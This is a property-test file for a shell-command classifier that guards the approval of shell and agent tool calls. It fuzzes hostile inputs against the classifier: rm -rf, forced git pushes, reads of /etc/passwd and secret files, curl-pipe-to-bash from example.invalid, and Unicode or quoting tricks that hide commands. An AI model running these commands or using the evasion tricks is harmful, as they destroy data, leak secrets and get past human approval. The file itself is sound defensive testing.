/**
 * Property tests for the floor's allow-class reading (pair/shell.ts + pair/classify.ts), with a seeded
 * generator (mulberry32: fixed seeds, so a failure names its case and reproduces).
 *
 * The one invariant: a `[y]` never approves a command that does more than a read, a test, a build, a linter or
 * formatter — however the dangerous part is joined, hidden, quoted, prefixed or padded. Each property takes
 * commands that ARE allow-class on their own and injects something that is not, then asks all three doors a
 * key goes through: the command itself, the structured tool call, and the painted one-line dialog.
 *
 * Nothing here runs a command: every string is only classified.
 */
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { isAllowClass, isAllowedCommand, isAllowToolCall, isDenyClass } from './classify.js'
import { parseShell } from './shell.js'

// ── a seeded generator ──────────────────────────────────────────────────────────────────────────────

function mulberry32(seed: number): () => number {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}
type Rng = () => number
const pick = <T>(rng: Rng, items: readonly T[]): T => items[Math.floor(rng() * items.length)]!
const int = (rng: Rng, lo: number, hi: number): number => lo + Math.floor(rng() * (hi - lo + 1))
const blank = (rng: Rng, min = 0): string => Array.from({ length: int(rng, min, 3) }, () => pick(rng, [' ', '\t'])).join('')

/** Run `property` over `runs` cases from each seed; report the first failing case with its seed. */
function forAll(seeds: number[], runs: number, gen: (rng: Rng) => string, property: (input: string) => boolean): void {
  for (const seed of seeds) {
    const rng = mulberry32(seed)
    for (let i = 0; i < runs; i++) {
      const input = gen(rng)
      if (!property(input)) throw new Error(`seed ${seed}, case ${i}: ${JSON.stringify(input)}`)
    }
  }
}
const SEEDS = [1, 2, 3, 0xc0ffee, 20260927]

// ── the project ─────────────────────────────────────────────────────────────────────────────────────

const root = realpathSync(mkdtempSync(join(tmpdir(), 'classify-fuzz-')))
const home = join(root, 'home')
const cwd = join(home, 'code', 'app')
const outside = join(root, 'outside')
beforeAll(() => {
  mkdirSync(join(cwd, 'src'), { recursive: true })
  mkdirSync(join(cwd, '.git', 'hooks'), { recursive: true })
  mkdirSync(join(outside, 'deep'), { recursive: true })
  writeFileSync(join(cwd, 'README.md'), 'hello\n')
  writeFileSync(join(cwd, 'package.json'), '{}\n')
  writeFileSync(join(outside, 'secret'), 'key\n')
  writeFileSync(join(home, '.zshrc'), '# rc\n')
  symlinkSync(join(outside, 'deep'), join(cwd, 'into'))
  symlinkSync(join(outside, 'secret'), join(cwd, 'notes.txt'))
  symlinkSync(join(outside, 'new.txt'), join(cwd, 'dangling'))
})
afterAll(() => rmSync(root, { recursive: true, force: true }))
const at = { cwd, home }

/**
 * Every door a key goes through: the command, the tool call, and a painted one-line Bash dialog. A painted line
 * is read trimmed (a pane pads its lines), so the painted door is asked only of commands whose ends are not
 * blanks a trim would take (`\f`, U+00A0): the command and tool-call doors read those exactly.
 */
function anyDoorAllows(command: string): boolean {
  const paintable = !/[\r\n]/.test(command) && command === command.trim()
  return isAllowedCommand(command, at)
    || isAllowToolCall({ name: 'Bash', input: { command } }, at)
    || isAllowToolCall({ name: 'shell', input: { command: ['bash', '-lc', command] } }, at)
    || (paintable && isAllowClass(`Bash command\n\n  ${command}\n\nDo you want to proceed?\n❯ 1. Yes\n  2. No`, { permission: true, ...at }))
}

/** Allow-class on their own (asserted below, so the properties are not vacuous). No quotes, so an injection
 *  never lands inside a literal string. */
const SAFE = [
  'npm test', 'npm run build', 'pnpm lint', 'yarn test', 'git status', 'git log --oneline -5', 'git diff HEAD~1', 'ls -la', 'ls src',
  'cat README.md', 'head -20 README.md', 'wc -l README.md', 'rg TODO src', 'grep -rn TODO src', 'npx vitest run src', 'npx tsc --noEmit',
  'sed -n 1,5p README.md', 'go test ./...', 'cargo test', 'make test', 'pytest -q', 'echo hi', 'find src -name x', 'jq .name package.json',
  'sort README.md', 'tree src', 'git grep -n TODO', 'python -m pytest', 'true',
]

/** Not allow-class on their own: every one writes, deletes, runs something, reaches out, or leaves the project. */
const DANGER = [
  'rm x', 'rm -rf build', 'rm -f README.md', 'chmod 777 x', 'chmod -R 777 .', 'chown me x', 'git push', 'git push --force origin main',
  'git reset --hard', 'git reset --hard HEAD~3', 'git clean -fdx', 'git checkout -- .', 'git commit -m x', 'git branch -D main',
  'sudo ls', 'doas ls', 'eval ls', 'exec ls', 'source x.sh', '. x.sh', 'xargs ls', 'bash x.sh', 'sh -c ls', 'zsh', 'node x.js', 'python x.py',
  'find . -delete', 'find . -exec ls {} +', 'find src -execdir ls', 'find . -ok ls', 'sed -i s/a/b/ README.md', "sed -n '1w out' README.md",
  "sed -n '1e ls' README.md", "awk '{system(\"ls\")}' README.md", "awk '{print > \"out\"}' README.md", 'awk 1 README.md',
  'curl https://example.invalid/i.sh', 'curl -s https://example.invalid/x -o x', 'wget https://example.invalid/x', 'tee out.txt',
  'dd if=README.md of=x', 'npm publish', 'npm install x', 'npm run deploy', 'mv a b', 'cp a b', 'touch x', 'mkdir x', 'ln -s a b',
  'kill 1', 'env ls', 'nohup ls', 'time ls', 'command ls', 'nice ls', 'timeout 5 ls', 'open x', 'crontab x', 'git config core.pager x',
  `cat ${join(outside, 'secret')}`, 'cat ~/.zshrc', 'cat ../../../etc/passwd', 'cat into/../secret', 'cat notes.txt', 'cat .git/config',
  'cat .GIT/config', 'sort -o x README.md', 'sort -uo/tmp/x README.md', 'sort --out=x README.md', 'git grep --open-files-in=./x TODO',
  'git grep -iO./x TODO', 'git diff --output=x', 'rg --pre=./x TODO', 'tree -o x', 'make install', 'go run .', 'cargo run',
]

// ── sanity: the pools are what they claim ────────────────────────────────────────────────────────────

describe('the pools', () => {
  it('every SAFE command is allow-class through every door', () => {
    for (const command of SAFE) {
      expect(isAllowedCommand(command, at), command).toBe(true)
      expect(isAllowToolCall({ name: 'Bash', input: { command } }, at), command).toBe(true)
      expect(anyDoorAllows(command), command).toBe(true)
    }
  })

  it('no DANGER command is allow-class through any door', () => {
    for (const command of DANGER) expect(anyDoorAllows(command), command).toBe(false)
  })
})

// ── properties ──────────────────────────────────────────────────────────────────────────────────────

describe('never allow-class, however it is joined', () => {
  const SEPARATORS = [';', '&', '&&', '||', '|', '|&', '\n', '\r\n', '\r', '\n\n', ' \\\n']

  it('a dangerous command joined before, after or between safe ones, by any separator or line break', () => {
    forAll(SEEDS, 800, (rng) => {
      const parts = Array.from({ length: int(rng, 1, 3) }, () => pick(rng, SAFE))
      parts.splice(int(rng, 0, parts.length), 0, pick(rng, DANGER))
      return parts.reduce((line, part) => `${line}${blank(rng)}${pick(rng, SEPARATORS)}${blank(rng)}${part}`)
    }, (command) => !anyDoorAllows(command))
  })

  it('safe commands joined by the separators the tokenizer reads stay allow-class (the property is not vacuous)', () => {
    forAll(SEEDS, 200, (rng) => {
      const parts = Array.from({ length: int(rng, 2, 4) }, () => pick(rng, SAFE))
      return parts.reduce((line, part) => `${line}${blank(rng)}${pick(rng, [';', '&&', '||', '|', '&'])}${blank(rng, 1)}${part}`)
    }, (command) => isAllowedCommand(command, at))
  })
})

describe('never allow-class, however it is hidden', () => {
  /** Anything a shell would expand or open: refused wherever it stands. */
  const EXPANSIONS = ['$(ls)', '`ls`', '<(ls)', '>(ls)', '$HOME', '${HOME}', "$'\\x41'", '$((1))', '$1', '$?', '$$', '<<EOF', '<<<x',
    '(ls)', '{ls,x}', '<>x', '"$(ls)"', '"`ls`"', '"a$HOME"', 'a$(ls)b', 'x`ls`', '$IFS']

  it('an expansion, substitution, subshell, brace or heredoc anywhere between words or glued to one', () => {
    forAll(SEEDS, 600, (rng) => {
      const words = pick(rng, SAFE).split(' ')
      const e = pick(rng, EXPANSIONS)
      const i = int(rng, 1, words.length)
      if (rng() < 0.5 || i === words.length) words.splice(i, 0, e)
      else words[i] = rng() < 0.5 ? `${words[i]}${e}` : `${e}${words[i]}`
      return words.join(pick(rng, [' ', '  ', '\t']))
    }, (command) => !anyDoorAllows(command))
  })

  it('a comment or negation at a word start', () => {
    forAll(SEEDS, 200, (rng) => {
      const words = pick(rng, SAFE).split(' ')
      words.splice(int(rng, 0, words.length), 0, `${pick(rng, ['#', '!'])}${pick(rng, ['', 'x', ' rm x', '; rm x'])}`)
      return words.join(' ')
    }, (command) => !anyDoorAllows(command))
  })

  /** Invisible, control and look-alike characters: what the person reads is not what runs. */
  const UNREADABLE = ['​', '‌', '‍', '⁠', '﻿', '­', '‮', '‭', '⁦', '⁩', '\u0085', '\u009b',
    ' ', ' ', ' ', '　', ' ', '；', '｜', '＆', ';', '﹔', '＄', '＞', '（',
    '\x00', '\x07', '\x1b', '\x7f', '\x0b', '\x0c']

  it('an invisible, control or look-alike character anywhere', () => {
    forAll(SEEDS, 800, (rng) => {
      const base = rng() < 0.5 ? pick(rng, SAFE) : `${pick(rng, SAFE)} ${pick(rng, DANGER)}`
      const i = int(rng, 0, base.length)
      return `${base.slice(0, i)}${pick(rng, UNREADABLE)}${base.slice(i)}`
    }, (command) => !anyDoorAllows(command))
  })

  it('a look-alike separator between a safe and a dangerous command', () => {
    forAll(SEEDS, 300, (rng) => `${pick(rng, SAFE)}${blank(rng)}${pick(rng, ['；', ';', '﹔', '｜', '＆＆', ' ', '\u0085'])}${blank(rng)}${pick(rng, DANGER)}`,
      (command) => !anyDoorAllows(command))
  })
})

describe('never allow-class, however it is quoted or escaped', () => {
  /** Shell-quote `word` at random: `rm` → `r\m`, `"rm"`, `r''m`, `'r'm`, `"r"'m'`. The shell reads them all as `rm`. */
  const obfuscate = (rng: Rng, word: string): string => {
    let out = ''
    for (let i = 0; i < word.length;) {
      const n = int(rng, 1, word.length - i)
      const chunk = word.slice(i, i + n)
      const style = int(rng, 0, 4)
      out += style === 0 ? chunk
        : style === 1 ? `'${chunk}'`
        : style === 2 ? `"${chunk}"`
        : style === 3 ? [...chunk].map((c) => `\\${c}`).join('')
        : `${chunk}''`
      i += n
    }
    return out
  }
  const HIDDEN = ['rm x', 'rm -rf build', 'git push', 'git push --force', 'git reset --hard', 'git clean -f', 'chmod 777 x', 'sudo ls',
    'eval ls', 'xargs ls', 'curl https://example.invalid', 'node x.js', 'bash x.sh', 'git commit -m x', 'npm publish', 'mv a b']

  it('every word of a dangerous command quoted or escaped in any mix', () => {
    forAll(SEEDS, 800, (rng) => {
      const words = pick(rng, HIDDEN).split(' ').map((w) => (rng() < 0.7 ? obfuscate(rng, w) : w))
      const hidden = words.join(' ')
      return rng() < 0.5 ? hidden : `${pick(rng, SAFE)} ${pick(rng, ['&&', ';', '|'])} ${hidden}`
    }, (command) => !anyDoorAllows(command))
  })

  it('the tokenizer reads every obfuscation back to the word itself (so the test above tests the classifier, not a typo)', () => {
    forAll(SEEDS, 400, (rng) => {
      const word = pick(rng, ['rm', 'git', 'push', 'sudo', 'chmod', 'xargs'])
      return `${word} ${obfuscate(rng, word)}`
    }, (line) => {
      const parsed = parseShell(line)
      if (!parsed.ok) return false
      const [plain, read] = parsed.commands[0]!.words.map((w) => w.text)
      return plain === read
    })
  })

  it('a quoted or escaped command name is never allow-class, even a safe one', () => {
    forAll(SEEDS, 300, (rng) => {
      const [name, ...rest] = pick(rng, SAFE).split(' ')
      let hidden = obfuscate(rng, name!)
      if (hidden === name) hidden = `"${name}"`
      return [hidden, ...rest].join(' ')
    }, (command) => !isAllowedCommand(command, at))
  })

  it('a line continuation or a trailing backslash', () => {
    forAll(SEEDS, 200, (rng) => {
      const [a, b] = [pick(rng, SAFE), pick(rng, DANGER)]
      return pick(rng, [`${a} \\\n${b}`, `${a}\\\n; ${b}`, `${a} \\`, `${a}\\`])
    }, (command) => !anyDoorAllows(command))
  })
})

describe('never allow-class, however it is prefixed or redirected', () => {
  const NAMES = ['CI', 'NODE_OPTIONS', 'GIT_DIR', 'GIT_EXTERNAL_DIFF', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'PATH', 'PAGER', 'X', '_a1', 'BASH_ENV']
  const VALUES = ['1', '', './x', '--require=./x.js', '/tmp', 'vim', 'a=b']

  it('an environment prefix, one or several', () => {
    forAll(SEEDS, 400, (rng) => {
      const prefixes = Array.from({ length: int(rng, 1, 3) }, () => `${pick(rng, NAMES)}=${pick(rng, VALUES)}`)
      return `${prefixes.join(' ')} ${pick(rng, SAFE)}`
    }, (command) => !anyDoorAllows(command))
  })

  const WRAPPERS = ['sudo', 'sudo -u root', 'doas', 'eval', 'exec', 'source', '.', 'xargs', 'xargs -0', 'env', 'env -i', 'nohup', 'time',
    'command', 'builtin', 'nice', 'timeout 5', 'watch', 'stdbuf -o0', 'caffeinate', 'arch -arm64', 'script -q /dev/null', 'unbuffer', 'strace', 'exec -a x']

  it('a wrapper that runs whatever follows it', () => {
    forAll(SEEDS, 400, (rng) => `${pick(rng, WRAPPERS)}${blank(rng, 1)}${pick(rng, SAFE)}`, (command) => !anyDoorAllows(command))
    forAll(SEEDS, 200, (rng) => `${pick(rng, ['bash', 'sh', 'zsh', 'dash'])} -c '${pick(rng, SAFE)}'`, (command) => !anyDoorAllows(command))
  })

  const WRITES = ['>', '>>', '>|', '&>', '&>>', '1>', '2>', '9>', '>&', '1>>', '2>>']
  const TARGETS = ['out.txt', 'README.md', 'src/x.ts', '../x', '/tmp/x', '~/.zshrc', join(outside, 'x'), '.git/hooks/pre-commit', 'dangling', 'into/../x', 'a b']

  it('a redirection that writes anything but /dev/null', () => {
    forAll(SEEDS, 800, (rng) => `${pick(rng, SAFE)}${blank(rng)}${pick(rng, WRITES)}${blank(rng)}${pick(rng, TARGETS)}`, (command) => !anyDoorAllows(command))
  })

  it('a redirection that reads from outside the project, or opens read-write', () => {
    const OUT = ['../x', '/etc/passwd', '~/.zshrc', join(outside, 'secret'), 'notes.txt', 'into/../secret', '.git/config', '.GIT/config']
    forAll(SEEDS, 300, (rng) => `${pick(rng, SAFE)} ${pick(rng, ['<', '0<', '<>'])}${blank(rng)}${pick(rng, OUT)}`, (command) => !anyDoorAllows(command))
  })

  it('the documented safe redirections stay allow-class: folding descriptors, /dev/null, a project file read', () => {
    forAll(SEEDS, 300, (rng) => `${pick(rng, SAFE)} ${pick(rng, ['2>&1', '1>&2', '>/dev/null', '2>/dev/null', '&>/dev/null', '>> /dev/null', '< README.md', '<&0'])}`,
      (command) => isAllowedCommand(command, at))
  })
})

describe('never allow-class, whatever the tool', () => {
  it('find, sed, awk, git, sort, grep with any of their write- or exec-capable forms in any position', () => {
    const FORMS: Array<[string, string[]]> = [
      ['find src', ['-delete', '-exec ls {} +', '-execdir ls ;', '-ok ls ;', '-okdir ls ;', '-fprint x', '-fprint0 x', '-fprintf x %p', '-fls x']],
      ['sed -n', ['-i 1p README.md', "'1w x' README.md", "'e ls' README.md", "'1r /etc/passwd' README.md", '-e 1p README.md', '-f x README.md', '--in-place 1p README.md']],
      ['git', ['push', 'push -f', 'reset --hard', 'clean -fd', 'grep -O vim x', 'grep --open-files-in-pager=x y', 'grep --open=x y', 'grep -nOx y',
        'diff --output=x', 'log --outp=x', 'diff --ext-diff', 'log --ext', '-c core.pager=x log', '-C /tmp status', '--git-dir=/tmp log',
        'stash drop', 'reflog expire --all', 'branch -D x', 'remote add x y', 'config x y', 'checkout .', 'restore .', 'apply x', 'am x', 'rebase x']],
      ['sort', ['-o x README.md', '-uo x README.md', '-o./x README.md', '--output=x README.md', '--out x README.md', '-T/tmp README.md',
        '--compress-program=x README.md', '--compress=x README.md', '--files0-from=x', '--files0=x']],
      ['grep', [`-f ${join(outside, 'secret')} README.md`, `-rf${join(outside, 'secret')} README.md`, `--file=${join(outside, 'secret')} README.md`, `x ${join(outside, 'secret')}`]],
      ['awk', ["'{system(\"ls\")}' README.md", "'{print > \"x\"}' README.md", "-f x README.md"]],
    ]
    forAll(SEEDS, 400, (rng) => {
      const [head, forms] = pick(rng, FORMS)
      return `${head} ${pick(rng, forms)}`
    }, (command) => !anyDoorAllows(command))
  })

  it('curl or wget piped anywhere into anything is deny-class, not just not allow-class', () => {
    forAll(SEEDS, 300, (rng) => {
      const download = `${pick(rng, ['curl', 'wget', 'fetch'])} ${pick(rng, ['-s', '-fsSL', '-qO-', ''])} https://example.invalid/${int(rng, 0, 99)}`
      return `${download}${blank(rng)}|${blank(rng)}${pick(rng, ['sh', 'bash', 'tee x', 'cat', 'head', 'sudo bash', 'python3', 'less'])}`
    }, (command) => isDenyClass(command) && !anyDoorAllows(command))
  })
})

describe('bounded time on long input', () => {
  const TIME = { budget: 1_000 }
  const time = (command: string): number => {
    const t = performance.now()
    anyDoorAllows(command)
    return performance.now() - t
  }

  it('200 KB of any shape is read in well under a second per door', () => {
    const N = 200_000
    for (const command of [
      `echo ${'a'.repeat(N)}`, `ls ${'x '.repeat(N / 2)}`, `cat ${'a/'.repeat(N / 2)}`, `cat ${'../'.repeat(N / 3)}`, `echo ${"''".repeat(N / 2)}`,
      `echo "${'\\\\'.repeat(N / 2)}"`, `echo '${'a'.repeat(N)}`, `rm -${'a'.repeat(N)}`, `${'true;'.repeat(N / 5)}true`, `${'ls|'.repeat(N / 3)}ls`,
      `dd ${' '.repeat(N)}x`, `${'dd '.repeat(N / 3)}`, `${'curl '.repeat(N / 5)}`, `${'--force'.repeat(N / 7)}`, `${'drop '.repeat(N / 5)}`,
      `git log ${'--oneline '.repeat(N / 10)}`, `find . ${'-name x '.repeat(N / 8)}`, `sed -n /${'a'.repeat(N)}/p README.md`,
      `${'​'.repeat(N)}`, `ls ${'é'.repeat(N)}`, `echo ${'$'.repeat(N)}`, `${'a=b '.repeat(N / 4)}ls`,
    ]) {
      expect(time(command), command.slice(0, 40)).toBeLessThan(TIME.budget)
    }
  })

  it('the longest command still read (a dialog\'s worth) with a path per word stays bounded', () => {
    expect(time(`ls ${'x '.repeat(7_998)}`)).toBeLessThan(4 * TIME.budget)
    expect(time(`cat ${'src/'.repeat(1_000)}x`)).toBeLessThan(TIME.budget)
  })
})
